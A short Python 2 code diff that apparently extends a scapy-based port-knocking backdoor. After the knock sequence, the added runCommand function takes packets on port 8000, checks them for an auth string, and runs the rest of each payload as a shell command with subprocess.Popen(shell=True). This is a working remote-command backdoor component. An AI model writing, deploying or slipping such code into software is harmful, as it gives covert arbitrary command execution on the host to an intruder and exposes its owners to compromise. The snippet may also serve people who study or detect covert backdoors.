@@ -53,10 +53,20 @@ def knock(packet):
             else:
                 print "You suck, state = 0"
 
+def runCommand(packet):
+    data = packet['Raw'].load
+    if data.startswith(authString):
+        data = data[len(authString):]
+        print "Running command " + data
+        output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = authString + output.stdout.read() + output.stderr.read()
+        print output
+
 def main():
     while state is not 3:
         sniff(filter='udp', prn=knock, count=1)
     print "test"
+    sniff("dst port 8000", prn=runCommand)
 
 if __name__ == '__main__':
     main()
